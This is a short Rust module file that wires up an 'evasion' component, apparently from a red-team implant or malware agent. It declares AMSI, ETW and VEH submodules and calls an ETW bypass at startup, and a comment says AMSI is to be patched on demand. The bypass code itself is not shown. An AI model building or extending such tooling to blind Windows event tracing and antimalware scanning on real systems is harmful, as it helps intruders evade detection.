use crate::evasion::etw::etw_bypass;

pub mod amsi;
mod etw;
mod veh;

pub fn run_evasion() {
    //
    // Note these functions are feature gated on the inside of their calls so dont worry about that :)
    //

    etw_bypass();

    //
    // Note we do not try patch AMSI here, that should be done on demand in the process when required. AMSI is loaded as
    // amsi.dll.
    //
}
